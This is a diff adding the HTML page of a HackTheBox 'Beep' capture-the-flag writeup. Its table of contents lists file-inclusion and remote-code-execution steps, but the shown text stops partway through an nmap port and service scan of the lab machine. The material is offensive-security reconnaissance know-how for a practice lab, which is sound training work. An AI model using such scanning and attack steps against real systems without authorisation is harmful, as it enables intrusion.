@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HackTheBox - Beep Writeup | SH∆FIQ ∆IM∆N</title>
+<meta property="og:title" content="HackTheBox - Beep Writeup | SH∆FIQ ∆IM∆N" />
+<meta name="twitter:title" content="HackTheBox - Beep Writeup | SH∆FIQ ∆IM∆N" />
+<meta itemprop="name" content="HackTheBox - Beep Writeup | SH∆FIQ ∆IM∆N" />
+<meta name="application-name" content="HackTheBox - Beep Writeup | SH∆FIQ ∆IM∆N" />
+<meta property="og:site_name" content="SH∆FIQ ∆IM∆N" />
+
+<meta name="description" content="Minimal Hugo blog theme with light and dark mode support">
+<meta itemprop="description" content="Minimal Hugo blog theme with light and dark mode support" />
+<meta property="og:description" content="Minimal Hugo blog theme with light and dark mode support" />
+<meta name="twitter:description" content="Minimal Hugo blog theme with light and dark mode support" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+
+
+  <meta itemprop="image" content="http://example.com" />
+  <meta property="og:image" content="http://example.com" />
+  <meta name="twitter:image" content="http://example.com" />
+  <meta name="twitter:image:src" content="http://example.com" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2022-01-21T00:00:00Z />
+    <meta property="article:published_time" content=2022-01-21T00:00:00Z />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "HackTheBox - Beep Writeup",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2022-01-21",
+        "description": "",
+        "wordCount":  1114 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2022-01-21",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "SH∆FIQ ∆IM∆N"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.119.0">
+
+    
+
+    <link rel="canonical" href="http://example.com/posts/htb/beep/">
+    <link href="/style.min.b7e4bda148ee8a6b6e7d052cb6d77374a2dca955a40352c3ccf576dc5f33af2c.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://example.com/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://example.com/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/tags/">
+                        Tags
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/search/">
+                        Search
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HackTheBox - Beep Writeup</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2022-01-21T00:00:00&#43;00:00" itemprop="datePublished"> 21 Jan 2022 </time>
+                </div>
+                
+            </header>
+                <details class="toc">
+                    <summary><b>Table of Contents</b></summary>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#nmap">Nmap</a>
+      <ul>
+        <li><a href="#the-result">the result</a></li>
+        <li><a href="#webserver">Webserver</a></li>
+        <li><a href="#gobuster">Gobuster</a></li>
+        <li><a href="#admin">/admin</a></li>
+        <li><a href="#local-file-inclusionlfi">Local File Inclusion/LFI</a></li>
+      </ul>
+    </li>
+    <li><a href="#method-1">Method: 1</a>
+      <ul>
+        <li><a href="#ssh">SSH</a></li>
+        <li><a href="#the-flag">the flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#method-2">Method: 2</a>
+      <ul>
+        <li><a href="#rce">RCE</a></li>
+        <li><a href="#18650py3">18650.py3</a></li>
+        <li><a href="#svwarsipvicious">svwar/SIPVicious</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-asterisk">Shell as Asterisk</a></li>
+  </ul>
+</nav>
+                </details>
+                <div class="page-content">
+                <h2 id="nmap">Nmap</h2>
+<p>As always. I&rsquo;m gonna run the Nmap scan against this IP address <code>10.10.10.7</code>.  Here is the result of the scan</p>
+<h3 id="the-result">the result</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mi">7</span><span class="p">.</span><span class="mi">92</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">initiated</span><span class="w"> </span><span class="n">Sun</span><span class="w"> </span><span class="n">Jan</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="mi">05</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">13</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">beep_all</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">7</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">7</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">056</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Not</span><span class="w"> </span><span class="n">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">65519</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">tcp</span><span class="w"> </span><span class="n">ports</span><span class="w"> </span><span class="p">(</span><span class="k">reset</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PORT</span><span class="w">      </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w">    </span><span class="k">VERSION</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w">    </span><span class="k">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">        </span><span class="n">OpenSSH</span><span class="w"> </span><span class="mi">4</span><span class="p">.</span><span class="mi">3</span><span class="w"> </span><span class="p">(</span><span class="n">protocol</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">1024</span><span class="w"> </span><span class="n">ad</span><span class="p">:</span><span class="n">ee</span><span class="p">:</span><span class="mi">5</span><span class="n">a</span><span class="p">:</span><span class="n">bb</span><span class="p">:</span><span class="mi">69</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="n">fb</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="n">af</span><span class="p">:</span><span class="n">b8</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">72</span><span class="p">:</span><span class="n">a0</span><span class="p">:</span><span class="n">f9</span><span class="p">:</span><span class="mi">6</span><span class="n">f</span><span class="p">:</span><span class="mi">53</span><span class="w"> </span><span class="p">(</span><span class="n">DSA</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="mi">2048</span><span class="w"> </span><span class="n">bc</span><span class="p">:</span><span class="n">c6</span><span class="p">:</span><span class="mi">73</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">a1</span><span class="p">:</span><span class="mi">8</span><span class="n">a</span><span class="p">:</span><span class="mi">4</span><span class="n">b</span><span class="p">:</span><span class="mi">55</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">65</span><span class="p">:</span><span class="mi">1</span><span class="n">d</span><span class="p">:</span><span class="mi">6</span><span class="n">d</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="w"> </span><span class="p">(</span><span class="n">RSA</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">25</span><span class="o">/</span><span class="n">tcp</span><span class="w">    </span><span class="k">open</span><span class="w">  </span><span class="n">smtp</span><span class="w">       </span><span class="k">Postfix</span><span class="w"> </span><span class="n">smtpd</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_smtp</span><span class="o">-</span><span class="n">commands</span><span class="p">:</span><span class="w"> </span><span class="n">beep</span><span class="p">.</span><span class="n">localdomain</span><span class="p">,</span><span class="w"> </span><span class="n">PIPELINING</span><span class="p">,</span><span class="w"> </span><span class="k">SIZE</span><span class="w"> </span><span class="mi">10240000</span><span class="p">,</span><span class="w"> </span><span class="n">VRFY</span><span class="p">,</span><span class="w"> </span><span class="n">ETRN</span><span class="p">,</span><span class="w"> </span><span class="n">ENHANCEDSTATUSCODES</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="n">BITMIME</span><span class="p">,</span><span class="w"> </span><span class="n">DSN</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w">    </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">       </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="w"> </span><span class="p">(</span><span class="n">CentOS</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">Did</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">follow</span><span class="w"> </span><span class="n">redirect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">7</span><span class="o">/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">110</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">pop3</span><span class="w">       </span><span class="n">Cyrus</span><span class="w"> </span><span class="n">pop3d</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">7</span><span class="o">-</span><span class="n">Invoca</span><span class="o">-</span><span class="n">RPM</span><span class="o">-</span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">7</span><span class="o">-</span><span class="mi">7</span><span class="p">.</span><span class="n">el5_6</span><span class="p">.</span><span class="mi">4</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_pop3</span><span class="o">-</span><span class="n">capabilities</span><span class="p">:</span><span class="w"> </span><span class="n">PIPELINING</span><span class="w"> </span><span class="n">TOP</span><span class="w"> </span><span class="n">APOP</span><span class="w"> </span><span class="n">LOGIN</span><span class="o">-</span><span class="n">DELAY</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="n">EXPIRE</span><span class="p">(</span><span class="n">NEVER</span><span class="p">)</span><span class="w"> </span><span class="n">UIDL</span><span class="w"> </span><span class="k">USER</span><span class="w"> </span><span class="n">STLS</span><span class="w"> </span><span class="k">IMPLEMENTATION</span><span class="p">(</span><span class="n">Cyrus</span><span class="w"> </span><span class="n">POP3</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">v2</span><span class="p">)</span><span class="w"> </span><span class="n">AUTH</span><span class="o">-</span><span class="n">RESP</span><span class="o">-</span><span class="n">CODE</span><span class="w"> </span><span class="n">RESP</span><span class="o">-</span><span class="n">CODES</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="nb">date</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_tls</span><span class="o">-</span><span class="n">nextprotoneg</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_tls</span><span class="o">-</span><span class="n">alpn</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_sslv2</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">111</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">rpcbind</span><span class="w">    </span><span class="mi">2</span><span class="w"> </span><span class="p">(</span><span class="n">RPC</span><span class="w"> </span><span class="o">#</span><span class="mi">100000</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">rpcinfo</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">program</span><span class="w"> </span><span class="k">version</span><span class="w">    </span><span class="n">port</span><span class="o">/</span><span class="n">proto</span><span class="w">  </span><span class="n">service</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">100000</span><span class="w">  </span><span class="mi">2</span><span class="w">            </span><span class="mi">111</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="n">rpcbind</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">100000</span><span class="w">  </span><span class="mi">2</span><span class="w">            </span><span class="mi">111</span><span class="o">/</span><span class="n">udp</span><span class="w">   </span><span class="n">rpcbind</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">100024</span><span class="w">  </span><span class="mi">1</span><span class="w">            </span><span class="mi">875</span><span class="o">/</span><span class="n">udp</span><span class="w">   </span><span class="n">status</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="mi">100024</span><span class="w">  </span><span class="mi">1</span><span class="w">            </span><span class="mi">878</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="n">status</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">143</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">imap</span><span class="w">       </span><span class="n">Cyrus</span><span class="w"> </span><span class="n">imapd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">7</span><span class="o">-</span><span class="n">Invoca</span><span class="o">-</span><span class="n">RPM</span><span class="o">-</span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">7</span><span class="o">-</span><span class="mi">7</span><span class="p">.</span><span class="n">el5_6</span><span class="p">.</span><span class="mi">4</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_tls</span><span class="o">-</span><span class="n">nextprotoneg</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_imap</span><span class="o">-</span><span class="n">capabilities</span><span class="p">:</span><span class="w"> </span><span class="k">RENAME</span><span class="w"> </span><span class="n">OK</span><span class="w"> </span><span class="n">THREAD</span><span class="o">=</span><span class="k">REFERENCES</span><span class="w"> </span><span class="n">IMAP4rev1</span><span class="w"> </span><span class="n">SORT</span><span class="o">=</span><span class="n">MODSEQ</span><span class="w"> </span><span class="n">ID</span><span class="w"> </span><span class="n">X</span><span class="o">-</span><span class="n">NETSCAPE</span><span class="w"> </span><span class="n">LIST</span><span class="o">-</span><span class="n">SUBSCRIBED</span><span class="w"> </span><span class="n">ACL</span><span class="w"> </span><span class="n">NAMESPACE</span><span class="w"> </span><span class="n">CATENATE</span><span class="w"> </span><span class="n">LISTEXT</span><span class="w"> </span><span class="n">RIGHTS</span><span class="o">=</span><span class="n">kxte</span><span class="w"> </span><span class="n">SORT</span><span class="w"> </span><span class="k">NO</span><span class="w"> </span><span class="n">QUOTA</span><span class="w"> </span><span class="n">IDLE</span><span class="w"> </span><span class="n">CONDSTORE</span><span class="w"> </span><span class="n">IMAP4</span><span class="w"> </span><span class="n">ANNOTATEMORE</span><span class="w"> </span><span class="n">THREAD</span><span class="o">=</span><span class="n">ORDEREDSUBJECT</span><span class="w"> </span><span class="nb">BINARY</span><span class="w"> </span><span class="k">ATOMIC</span><span class="w"> </span><span class="n">URLAUTHA0001</span><span class="w"> </span><span class="n">CHILDREN</span><span class="w"> </span><span class="n">UNSELECT</span><span class="w"> </span><span class="n">Completed</span><span class="w"> </span><span class="n">UIDPLUS</span><span class="w"> </span><span class="n">MULTIAPPEND</span><span class="w"> </span><span class="n">LITERAL</span><span class="o">+</span><span class="w"> </span><span class="n">MAILBOX</span><span class="o">-</span><span class="n">REFERRALS</span><span class="w"> </span><span class="n">STARTTLS</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_tls</span><span class="o">-</span><span class="n">alpn</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="nb">date</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_imap</span><span class="o">-</span><span class="n">ntlm</span><span class="o">-</span><span class="n">info</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_sslv2</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">443</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">ssl</span><span class="o">/</span><span class="n">http</span><span class="w">   </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="w"> </span><span class="p">((</span><span class="n">CentOS</span><span class="p">))</span><span class="w">
